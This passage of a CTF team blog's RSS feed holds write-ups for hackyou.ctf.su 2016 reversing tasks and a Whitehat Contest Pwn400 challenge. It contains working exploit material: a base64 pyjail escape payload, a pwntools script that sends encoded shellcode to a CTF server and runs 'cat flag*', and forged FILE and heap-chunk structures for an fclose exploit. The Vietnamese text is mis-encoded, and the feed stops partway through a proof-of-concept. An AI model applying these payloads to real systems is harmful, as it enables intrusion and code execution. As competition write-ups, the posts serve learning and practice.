<p style="text-align: left;"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?ssl=1"><img data-attachment-id="647" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/4-1/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?fit=584%2C252&amp;ssl=1" data-orig-size="584,252" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4.1" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?fit=300%2C129&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?fit=584%2C252&amp;ssl=1" class="size-full wp-image-647 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?resize=584%2C252&#038;ssl=1" alt="" width="584" height="252" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?w=584&amp;ssl=1 584w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/4.1.png?resize=300%2C129&amp;ssl=1 300w" sizes="(max-width: 584px) 100vw, 584px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;"><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?ssl=1"><img data-attachment-id="648" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/4-2/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?fit=782%2C300&amp;ssl=1" data-orig-size="782,300" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="4.2" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?fit=300%2C115&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?fit=604%2C232&amp;ssl=1" class="size-full wp-image-648 aligncenter" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?resize=604%2C232&#038;ssl=1" alt="" width="604" height="232" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?w=782&amp;ssl=1 782w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?resize=300%2C115&amp;ssl=1 300w, https://i1.wp.com/babyphd.net/wp-content/uploads/2017/05/4.2.png?resize=768%2C295&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;">Cháº¡y 1 lÃºc (á»Ÿ server cÅ©)</p>
<p style="text-align: left;"><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?ssl=1"><img data-attachment-id="649" data-permalink="https://babyphd.net/2017/05/12/asisctf-2017-web-secure-portal-123/attachment/5/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?fit=956%2C385&amp;ssl=1" data-orig-size="956,385" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="5" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?fit=300%2C121&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?fit=604%2C243&amp;ssl=1" class="size-full wp-image-649 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?resize=604%2C243&#038;ssl=1" alt="" width="604" height="243" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?w=956&amp;ssl=1 956w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?resize=300%2C121&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2017/05/5.png?resize=768%2C309&amp;ssl=1 768w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p style="text-align: left;">Sá»­ dá»¥ng auth trÃªn Ä‘á»ƒ láº¥y flag + source cho pháº§n thá»© 2.</p>
<p style="text-align: left;">&lt;continue&gt;</p>
]]></content:encoded>
									<post-id xmlns="com-wordpress:feed-additions:1">642</post-id>	</item>
		<item>
		<title>hackyou.ctf.su 2016</title>
		<link>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/</link>
				<comments>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/#comments</comments>
				<pubDate>Thu, 24 Nov 2016 17:13:17 +0000</pubDate>
		<dc:creator><![CDATA[justcallmedude]]></dc:creator>
				<category><![CDATA[pwn]]></category>
		<category><![CDATA[re]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=627</guid>
				<description><![CDATA[This is my write-up for recentÂ hack you spbÂ CTF - a CTF for newbies. I guess I'm a bit older here ahaha. Reverse 100: #include &#60;stdio.h&#62; #include &#60;string.h&#62; int main() { char buf[64]; gets(buf); int l = strlen(buf); if (l * l != 144) return 1; unsigned int a = buf[0] &#124; (buf[4] &#60;&#60; 8) &#124; &#8230; <a href="https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/" class="more-link">Continue reading <span class="screen-reader-text">hackyou.ctf.su 2016</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<p>This is my write-up for recentÂ <a href="http://hackyou.ctf.su/">hack you spb</a>Â CTF - a CTF for newbies. I guess I'm a bit older here ahaha.</p>
<p><span id="more-627"></span></p>
<p>Reverse 100:</p>
<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

int main() {
	char buf[64];
	gets(buf);
	int l = strlen(buf);
	if (l * l != 144)
		return 1;
	unsigned int a = buf[0] | (buf[4] &lt;&lt; 8) | (buf[8] &lt;&lt; 16);
	unsigned int b = buf[1] | (buf[5] &lt;&lt; 8) | (buf[9] &lt;&lt; 16);
	unsigned int c = buf[2] | (buf[6] &lt;&lt; 8) | (buf[10] &lt;&lt; 16);
	unsigned int d = buf[3] | (buf[7] &lt;&lt; 8) | (buf[11] &lt;&lt; 16);
	if (!(((a % 3571) == 2963) &amp;&amp; (((a % 2843) == 215)) &amp;&amp; (((a % 30243) == 13059))))
		return 2;
	if (!(((b % 80735) == 51964) &amp;&amp; (((b % 8681) == 2552)) &amp;&amp; (((b % 40624) == 30931))))
		return 3;
	if (!(((c % 99892) == 92228) &amp;&amp; (((c % 45629) == 1080)) &amp;&amp; (((c % 24497) == 12651))))
		return 4;
	if (!(((d % 54750) == 26981) &amp;&amp; (((d % 99627) == 79040)) &amp;&amp; (((d % 84339) == 77510))))
		return 5;
	printf("Congratulations %s is flag\n",buf);
	return 0;
}</pre>
<p>First of all, I think about use something like z3, or any SAT that could give me the valid number. But z3 took a lot of time, so I decided to look deeper... Yes, you could finger out there is a pattern (x % number1Â == number2), so you could applyÂ <b><a href="https://en.wikipedia.org/wiki/Chinese_remainder_theorem">Chinese remainder theorem</a>Â </b>to get a, b, c.</p>
<p>Reverse 200:<br />
This is a .pyc file, which is a file contain python byte-code. As usual, for byte-code relative problems, I search for some python byte-code decompiler and found <a href="https://github.com/zrax/pycdc">pycdc</a>.<br />
After decompil, you should get something like this</p>
<pre class="lang:python decode:true"># Source Generated with Decompyle++
# File: rev200_bot_7b541a1.pyc (Python 2.7)

import config
import traceback
import re
from base64 import *
from twx.botapi import TelegramBot, ReplyKeyboardMarkup, ReplyKeyboardHide
sec_state = { }

def process_message(bot, u):
Warning: Stack history is not empty!
    if u.message.sender and u.message.text and u.message.chat:
        chat_id = u.message.chat.id
        user = u.message.sender.username
        reply_hide = ReplyKeyboardHide.create()
        print 'user:%s mes:%s' % (user, u.message.text)
        if user not in sec_state:
            sec_state[user] = {
                'mode': 15,
                'stage': 7 }
        cmd1 = u.message.text.encode('utf-8')
        a = re.findall('(\\/\\w+)\\s*(.*)', cmd1)
        if a:
            cmd = a[0][0]
            data = a[0][1]
            if cmd == '/help':
                bot.send_message(chat_id, 'Usage: \n\n/help - show this help\n/enter - enter secret mode\n', reply_markup = reply_hide)
            if cmd == '/enter':
                keyboard = [
                    [
                        '-7-',
                        '-8-',
                        '-9-'],
                    [
                        '-4-',
                        '-5-',
                        '-6-'],
                    [
                        '-1-',
                        '-2-',
                        '-3-'],
                    [
                        '-0-']]
                reply_markup = ReplyKeyboardMarkup.create(keyboard)
                bot.send_message(chat_id, 'please enter access code', reply_markup = reply_markup).wait()
            if sec_state[user]['mode'] == 0 and cmd == '/7779317':
                ddd = b64decode(data)
                bot.send_message(chat_id, eval(ddd))
            
        a = re.findall('-(\\d+)-', cmd1)
        if a:
            num = a[0]
            if int(num) == sec_state[user]['stage']:
                sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
                sec_state[user]['mode'] = sec_state[user]['mode'] - 1
                if sec_state[user]['mode'] &lt; 0:
                    sec_state[user]['mode'] = 0
                if sec_state[user]['mode'] == 0:
                    bot.send_message(chat_id, 'Secret mode enabled!', reply_markup = reply_hide).wait()
                
            else:
                print 'NO', num, sec_state[user]['stage']
                bot.send_message(chat_id, 'Invalid password!', reply_markup = reply_hide).wait()
                sec_state[user]['mode'] = 15
        

bot = TelegramBot(config.token)
bot.update_bot_info().wait()
print bot.username
last_update_id = 0
while True:
    updates = bot.get_updates(offset = last_update_id).wait()
    
    try:
        for update in updates:
            if int(update.update_id) &gt; int(last_update_id):
                last_update_id = update.update_id
                process_message(bot, update)
                continue
    continue
    except Exception:
        ex = None
        print traceback.format_exc()
        continue
    
</pre>
<p>So this is a kind of chat-bot server based on Telegram.<br />
There is eval function inside,Â  bot.send_message(chat_id, eval(ddd)), so I need to control ddd which is a base64 decoded string from data we sent. Before that, I need to enter Secret mode by enter correct access code (0-9).<br />
First, setÂ sec_state[user]['mode'] = 0; First time, stage init to 7, that changed everytime you press the correct key; But if I dont remember the stage, I still could find out by bruteforce from 0 to 9, if I didn't recv incorrect message that's mean I pressed the correct one; then by use the following script, I'm able to access secret area;</p>
<pre class="lang:python decode:true ">#coding: utf-8
sec_state = { }
user = "A"
sec_state[user] = {
'mode': 15,
'stage': 7 } # bruteforce number
sec_state[user]['mode'] = 15
r = []
while 1:
	num = sec_state[user]['stage']
	r.append(num)
	print "-%d-" % num
	sec_state[user]['stage'] = (sec_state[user]['stage'] * sec_state[user]['stage'] ^ 1337) % 10
	sec_state[user]['mode'] = sec_state[user]['mode'] - 1
	if sec_state[user]['mode'] &lt; 0:
	    sec_state[user]['mode'] = 0
	if sec_state[user]['mode'] == 0:
		break

print sec_state[user]['mode']</pre>
<p>Next, this is a <a href="https://blog.inexplicity.de/plaidctf-2013-pyjail-writeup-part-i-breaking-the-sandbox.html">pyjail</a>, so I can't execute normal python command...<br />
So, final payload is `str(().__class__.__base__.__subclasses__()[<strong>40</strong>]("flag","r").read())`or `/7779317 c3RyKCgpLl9fY2xhc3NfXy5fX2Jhc2VfXy5fX3N1YmNsYXNzZXNfXygpWzQwXSgiZmxhZyIsInIiKS5yZWFkKCkp`</p>
<p>Reverse 300:<br />
Let's get some fun.</p>
<p>let reverse this (or not?), look at handler (the main function)</p>
<pre class="lang:c decode:true">ssize_t __cdecl handler(int fd)
{
  ssize_t result; // eax@1
  unsigned int buf; // [sp+20h] [bp-18h]@1
  int v3; // [sp+24h] [bp-14h]@1
  char *v4; // [sp+28h] [bp-10h]@4
  int v5; // [sp+2Ch] [bp-Ch]@4

  buf = 0;
  setuid(0x3E8u);
  seteuid(0x3E8u);
  setgid(0x3E8u);
  setegid(0x3E8u);
  result = recv(fd, &amp;buf, 4u, 0);
  v3 = result;
  if ( result == 4 )
  {
    result = buf;
    if ( buf &lt;= 0xC8 )
    {
      v4 = (char *)mmap(0, buf, 7, 33, -1, 0);
      v3 = recv(fd, v4, buf, 0);
      result = crc32(0, v4, buf);
      v5 = result;
      if ( result == 0xCAFEBABE )
      {
        result = filter(v4, buf) ^ 1;
        if ( !(_BYTE)result )
          result = ((int (*)(void))v4)();
      }
    }
  }
  return result;
}</pre>
<p>So the basic idea is make result == 0xCAFEBABE, so the program will execute v4 as shellcode (function pointer), but you also need to bypass the filter function - check if contain any of 0x0, 0x1, 0x2f, 0x68, 0x73 ( so I can't use sh in plaintext)then exit; So, I did the following step:</p>
<p>1. Find a program that can make crc32 of my shellcode equal 0xCAFEBABE<br />
2.Â Make a great shellcode and Bypass filter.<br />
By search google for everything, the answer for problem 1 is<a href="https://www.nayuki.io/page/forcing-a-files-crc-to-any-value"> force-crc32</a>.<br />
Currently I'm also trying to learn some binary exploit method, write a shellcode isn't hard (hint <em>xor</em>), but if there is any framework that's good enough asÂ <a href="https://github.com/Gallopsled/pwntools"><code>pwntools</code>Â </a>, you shoud try at least once.<br />
Basicaly, I import pwns and let pwntools do the rest;</p>
<pre class="lang:python decode:true ">from pwn import *
import socket, struct, telnetlib
def getCRC(data):
	import subprocess
	with open('/tmp/12', 'wb') as f:
		f.write(data + "123456")
	subprocess.check_output(['python', 'forcecrc32.py', '/tmp/12', str(len(data)+1) , 'CAFEBABE'])
	with open('/tmp/12', 'rb') as f:
		data = f.read()
	return data
def crc32(data):# recheck
	import zlib
	return (zlib.crc32(data)) &amp; 0xffffffff


d = ""
d += asm(pwnlib.shellcraft.i386.linux.dup2(4,0))
d += asm(pwnlib.shellcraft.i386.linux.dup2(4,1))
# i need dup2 because the program use itself as server
d += asm(pwnlib.shellcraft.i386.linux.sh())

fsc = pwnlib.encoders.encoder.encode(d, '\n\x01\0\x2f\x73\x68')

print len(fsc)
fsc = getCRC(fsc) # it didn't contain any blocked char, so i dont need to re-generate again.
print hex(crc32(fsc))

#yes, i love my custom socket lib <img src="https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f641.png" alt="ğŸ™" class="wp-smiley" style="height: 1em; max-height: 1em;" />
s = socket.create_connection(("78.46.101.237", 3177))

s.send(p32(len(fsc)))
s.send(fsc)
s.send("\n")

s.send("cat flag*\n") 
print s.recv(1024)</pre>
<p>To be continued....</p>
]]></content:encoded>
							<wfw:commentRss>https://babyphd.net/2016/11/24/hackyou-ctf-su-2016/feed/</wfw:commentRss>
		<slash:comments>2</slash:comments>
						<post-id xmlns="com-wordpress:feed-additions:1">627</post-id>	</item>
		<item>
		<title>Whitehat Contest 12 - Pwn400</title>
		<link>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/</link>
				<comments>https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/#comments</comments>
				<pubDate>Sun, 11 Sep 2016 16:29:10 +0000</pubDate>
		<dc:creator><![CDATA[hardtobelieve]]></dc:creator>
				<category><![CDATA[pwn]]></category>
		<category><![CDATA[whitehat]]></category>

		<guid isPermaLink="false">https://babyphd.net/?p=600</guid>
				<description><![CDATA[LÃ­p váº«n nhá»› vÃ  yÃªu HÃ­p nhiá»u láº¯m ... Chiáº¿n Ä‘áº¥u bÃªn nhá»¯ng ngÆ°á»i anh em luÃ´n lÃ m tÃ´i cáº£m tháº¥y thoáº£i mÃ¡i vÃ  pháº¥n khÃ­ch. Äá»£t contest nÃ y cáº£ Ä‘á»™i Ä‘Ã£ cÃ³ 1 ngÃ y khÃ´ng ngá»§, cÅ©ng gáº§n nhÆ° khÃ´ng Äƒn, chá»‰ dÃ¹ng lon bÃ² hÃºc Ä‘á»ƒ cáº§m hÆ¡i. Cáº£ Ä‘á»™i Ä‘Ã£ ráº¥t ná»— &#8230; <a href="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/" class="more-link">Continue reading <span class="screen-reader-text">Whitehat Contest 12 - Pwn400</span> <span class="meta-nav">&#8594;</span></a>]]></description>
								<content:encoded><![CDATA[<blockquote><p>LÃ­p váº«n nhá»› vÃ  yÃªu HÃ­p nhiá»u láº¯m ...</p></blockquote>
<p>Chiáº¿n Ä‘áº¥u bÃªn nhá»¯ng ngÆ°á»i anh em luÃ´n lÃ m tÃ´i cáº£m tháº¥y thoáº£i mÃ¡i vÃ  pháº¥n khÃ­ch. Äá»£t contest nÃ y cáº£ Ä‘á»™i Ä‘Ã£ cÃ³ 1 ngÃ y khÃ´ng ngá»§, cÅ©ng gáº§n nhÆ° khÃ´ng Äƒn, chá»‰ dÃ¹ng lon bÃ² hÃºc Ä‘á»ƒ cáº§m hÆ¡i. Cáº£ Ä‘á»™i Ä‘Ã£ ráº¥t ná»— lá»±c vÃ  hy vá»ng trÃ n trá» khi lÃºc Ä‘áº§u liÃªn tá»¥c tranh giÃ nh top 1 vá»›i ká»³ phÃ¹ng Ä‘á»‹ch thá»§. Cho Ä‘áº¿n giá»¯a Ä‘Ãªm, do thiáº¿u má»™t chÃºt may máº¯n ( tÃ´i thÃ¬ khÃ´ng nghÄ© váº­y, Ä‘Ãªm lÃ  khoáº£ng thá»i gian tÃ´i hay rÆ¡i vÃ o tráº¡ng thÃ¡i khÃ´ng á»•n Ä‘á»‹nh <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?ssl=1"><img data-attachment-id="603" data-permalink="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/pudency/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" data-orig-size="147,147" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="pudency" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?fit=147%2C147&amp;ssl=1" class="alignnone size-full wp-image-603" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/pudency.png?resize=36%2C36&#038;ssl=1" alt="pudency" width="36" height="36" data-recalc-dims="1" /></a> ) mÃ  má»i ngÆ°á»i máº¥t dáº§n Ã½ chÃ­ chiáº¿n Ä‘áº¥u, nhÃ¬n Ä‘á»™i khÃ¡c vÆ°Æ¡n lÃªn. CÃ³ láº½ náº¿u nhÆ° tÃ´i dÃ nh Ä‘Æ°á»£c 400 Ä‘iá»ƒm tá»« bÃ i nÃ y thÃ¬ má»i chuyá»‡n Ä‘Ã£ khÃ¡c. NhÆ°ng dÃ¹ sao "cÃ³ láº½" váº«n chá»‰ lÃ  1 tá»« ngÆ°á»i ta dÃ¹ng Ä‘á»ƒ biá»‡n há»™ cho lá»—i láº§m cá»§a mÃ¬nh mÃ  thÃ´i.<br />
<span id="more-600"></span></p>
<p>Äá» bÃ i cho 1 file binary cÃ³ chá»©c nÄƒng dÃ¹ng Ä‘á»ƒ viáº¿t vÃ  Ä‘á»c 1 file trÃªn server. Thoáº¡t nhÃ¬n, tÃ´i Ä‘Ã£ tháº¥y bÃ i nÃ y quen rá»“i, vÃ  cÃ³ váº» nhÆ° <a href="http://www.hardtobelieve.me/index.php/2016/07/30/file-abusing/" target="_blank">chá»§ Ä‘á» nÃ y</a> vá»«a Ä‘Æ°á»£c tÃ´i nghiÃªn cá»©u cÃ¡ch Ä‘Ã¢y 2 thÃ¡ng. Ta cÃ³ thá»ƒ tháº¥y lá»—i khÃ¡ rÃµ rÃ ng á»Ÿ hÃ m `read_file`</p>
<pre class="lang:c decode:true ">int read_file()
{
  char ptr; // [sp+18h] [bp-110h]@4
  size_t n; // [sp+118h] [bp-10h]@4
  FILE *stream; // [sp+11Ch] [bp-Ch]@1

  printf("file name: ");
  __fpurge(stdin);
  gets(name);
  stream = fopen(name, "rb");
  if ( !stream )
  {
    puts("Error: cannot open file. ");
    exit(1);
  }
  fseek(stream, 0, 2);
  n = ftell(stream);
  fseek(stream, 0, 0);
  fread(&amp;ptr, 1u, n, stream);            // Does not check boundary of ptr
  puts(&amp;ptr);
  return fclose(stream);
}</pre>
<p>NhÆ° váº­y, ta cÃ³ thá»ƒ cho chÆ°Æ¡ng trÃ¬nh Ä‘á»c má»™t ná»™i dung file cÃ³ kÃ­ch thÆ°á»›c lá»›n Ä‘á»ƒ kÃ­ch hoáº¡t lá»—i buffer overflow. Tuy nhiÃªn, ta cÅ©ng tháº¥y `ptr` náº±m á»Ÿ `sp + 18h` cÃ²n `stream` thÃ¬ náº±m á»Ÿ `sp + 11Ch` nÃªn cÃ³ thá»ƒ khai thÃ¡c lá»—i báº±ng cÃ¡ch dÃ¹ng báº£ng <em>IO_FILE_JUMP</em>.</p>
<h2>BÃ i toÃ¡n 1</h2>
<p>Váº«n chiáº¿n thuáº­t cÅ©, tÃ´i báº¯t Ä‘áº§u tá»« chÆ°Æ¡ng trÃ¬nh Ä‘Æ¡n giáº£n hÆ¡n lÃ  gá»i hÃ m `fclose()` vá»›i tham sá»‘ truyá»n vÃ o lÃ  má»™t máº£ng char. Sau má»™t thá»i gian sá»­ dá»¥ng gdb vÃ  "lá»—i Ä‘áº¿n Ä‘Ã¢u sá»­a Ä‘áº¿n Ä‘Ã³", tÃ´i Ä‘Ã£ tÃ¬m Ä‘Æ°á»£c nhá»¯ng giÃ¡ trá»‹ cáº§n cÃ³ trong máº£ng</p>
<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
char a[256];

int main () {
    *((int *)a + 1) = 0xdeadbeaf;
    *((int *)a + 0x48 / 4) = a;
    *((int *)a + 0x94 / 4) = a - 4;
    fclose(a);
    return 0;
}</pre>
<p>VÃ  táº¥t nhiÃªn, káº¿t qá»§a sáº½ lÃ  `Invalid $PC address: 0xdeadbeaf`. Tuy nhiÃªn, láº§n nÃ y tÃ´i cÅ©ng nháº­n ra má»™t Ä‘iá»u lÃ  tÃ´i khÃ´ng thá»ƒ truyá»n Ä‘Æ°á»£c tham sá»‘ khi gá»i hÃ m theo kiá»ƒu nÃ y. Náº¿u cáº¥c báº¡n step tá»«ng bÆ°á»›c Ä‘á»ƒ vÃ o bÃªn trong libc, cÃ¡c báº¡n sáº½ tháº¥y trÆ°á»›c khi call ,libc sáº½ thá»±c hiá»‡n:</p>
<pre class="theme:shell-default lang:sh decode:true ">push 0x0
push esi                            ; file pointer
call DWORD PTR [eax + 0x8]</pre>
<p>TÃ´i phÃ¡t hiá»‡n ra ráº±ng chÆ°Æ¡ng trÃ¬nh khÃ´ng cÃ³ stack protector, nÃªn náº¿u nhÆ° tÃ´i lá»«a libc cho nÃ³ cháº¡y nhÆ° bÃ¬nh thÆ°á»ng vá»›i máº£ng char, tÃ´i cÃ³ thá»ƒ Ä‘Ã¨ lÃªn EIP vÃ  cÃ¡c gÃ­a trá»‹ sau Ä‘á»‘ rá»“i lÃ m nhÆ° nhá»¯ng bÃ i BoF bÃ¬nh thÆ°á»ng. TÃ´i thá»­ gá»i hÃ m puts thÃ¬ Ä‘Æ°á»£c káº¿t qá»§a:</p>
<pre class="theme:shell-default lang:sh decode:true ">free(): invalid pointer: 0x0804a060 ***</pre>
<p>KhÃ´ng ngoÃ i dá»± Ä‘oÃ¡n, theo nhÆ° nhá»¯ng gÃ¬ google Ä‘Æ°á»£c thÃ¬ hÃ m `fclose()` sau khi thá»±c hiá»‡n viá»‡c Ä‘Ã³ng file sáº½ giáº£i phÃ³ng bá»™ nhá»› Ä‘Ã£ cáº¥p trÆ°á»›c Ä‘Ã³ ( file pointer cÅ©ng lÃ  "hÃ­p" mÃ  <a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?ssl=1"><img data-attachment-id="611" data-permalink="https://babyphd.net/2016/09/11/whitehat-contest-11-pwn400/big_smile/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" data-orig-size="147,147" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="big_smile" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?fit=147%2C147&amp;ssl=1" class="alignnone size-full wp-image-611" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/big_smile.png?resize=36%2C36&#038;ssl=1" alt="big_smile" width="36" height="36" data-recalc-dims="1" /></a> ).</p>
<h2>BÃ i toÃ¡n 2</h2>
<p>NhÆ° váº­y, ngoÃ i viá»‡c biáº¿n máº£ng <strong>a</strong> thÃ nh má»™t con trá» file giáº£, thÃ¬ ta cÅ©ng cáº§n biáº¿n nÃ³ thÃ nh má»™t heap chunk giáº£ ná»¯a. Tiáº¿p tá»¥c sá»­ dá»¥ng gdb, láº§n nÃ y thÃªm má»™t cá»­a sá»• khÃ¡c Ä‘á»ƒ debug chÆ°Æ¡ng trÃ¬nh mÃ  free má»™t con trá» Ä‘Ã£ malloc thá»±c sá»±. Viá»‡c nÃ y giÃºp ta dá»… dÃ ng theo dÃµi luá»“ng thá»±c thi cá»§a chÆ°Æ¡ng trÃ¬nh Ä‘Ãºng vÃ  biáº¿t sáº½ pháº£i sá»­a cÃ¡i gÃ¬ cho chÆ°Æ¡ng trÃ¬nh sai. Sau má»™t há»“i lÃ¢u sá»­a Ä‘i sá»­a láº¡i, tÃ´i cÅ©ng cÃ³ Ä‘Æ°á»£c nhá»¯ng gÃ­a trá»‹ cáº§n tÃ¬m ( á»Ÿ Ä‘Ã¢y tÃ´i chá»n fclose(a + 16) cho nÃ³ thoáº£i mÃ¡i, trÃ¡nh trÆ°á»ng há»£p truy xuáº¥t vÃ o Ã´ nhá»› nÃ o Ä‘Ã³ phÃ­a trÆ°á»›c ):</p>
<pre class="lang:c decode:true ">#include &lt;stdio.h&gt;
char a[256];

int main () {
    puts("abcd");
    *((int *)a + 3) = 0xa1;
    *((int *)a + 4 + 1) = 0x8048350;
    *((int *)a + 4 + 0x48 / 4) = a + 16;
    *((int *)a + 4 + 0x94 / 4) = a + 16 - 4;
    *((int *)a + 43) = 0x20b59;
    *((int *)a + 44) = a + 34*4;
    *((int *)a + 45) = a + 38*4;
    *((int *)a + 34 + 3) = a + 42*4;
    *((int *)a + 38 + 2) = a + 42*4;
    fclose(a + 16);
    return 0;
}</pre>
<p>Váº­y lÃ  xong rá»“i, quay trá»Ÿ láº¡i bÃ i readfile, ta sáº½ thá»±c hiá»‡n 2 cÃ´ng viá»‡c:</p>
<ul>
<li>Gá»i hÃ m write_file Ä‘á»ƒ táº¡o ra má»™t file tÃªn lÃ  "inp", ná»™i dung sáº½ lÃ  `padding + name_address + padding + rop chain`</li>
<li>Gá»i hÃ m read_file, Ä‘á»c file cÃ³ tÃªn lÃ  "inp\x00" + fake_file_struct mÃ  ta vá»«a táº¡o ra</li>
</ul>
<p>Ez local shell, Ez life</p>
<pre class="theme:shell-default lang:sh decode:true ">[+] Opening connection to localhost on port 4000: Done
[*] Closed connection to localhost port 4000
[+] Opening connection to localhost on port 4000: Done
[*] Puts: 0xf7e5cb80
[*] Printf: 0xf7e46590
[*] Closed connection to localhost port 4000
[+] Opening connection to localhost on port 4000: Done
[*] Closed connection to localhost port 4000
[+] Opening connection to localhost on port 4000: Done
[*] Switching to interactive mode

$ id
uid=1000(tuanit96) gid=1000(hardtobelieve) groups=1000(hardtobelieve),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
$ whoami
tuanit96
$  </pre>
<h2> BÃ i toÃ¡n 3 </h2>
<p><strong>Proof of Concept</strong></p>
<pre class="lang:python decode:true ">from pwn import *

def read_file(name):
	s.sendline("2")
	s.recvuntil("file name: ")
	s.sendline(name)

def write_file(name, content):
	s.sendline("1")
	s.recvuntil("file name: ")
	s.sendline(name)
	s.recvuntil("Give me the size: ")
	#print s.recv()
